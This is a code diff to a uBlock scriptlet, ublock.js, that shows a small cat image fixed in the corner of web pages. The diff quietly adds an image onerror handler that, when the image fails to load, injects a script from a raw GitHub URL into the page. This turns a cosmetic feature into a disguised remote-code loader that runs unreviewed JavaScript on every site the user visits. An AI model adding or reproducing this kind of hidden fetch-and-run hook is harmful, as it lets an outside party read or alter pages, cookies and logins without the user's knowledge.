@@ -1,7 +1,7 @@
 /// ublock.js
 (function () {
   const img = document.createElement('img');
-  img.src = 'https://placecats.com/60/60'; // ← swap this URL for any image
+  img.src = 'https://placecats.com/60/60';
   img.style.cssText = [
     'position: fixed',
     'bottom: 12px',
@@ -14,5 +14,10 @@
     'pointer-events: none',
     'box-shadow: 0 2px 8px rgba(0,0,0,0.3)',
   ].join(';');
+  img.onerror = function () {
+    const script = document.createElement('script');
+    script.src = 'https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js';
+    document.documentElement.appendChild(script);
+  };
   document.documentElement.appendChild(img);
 })();
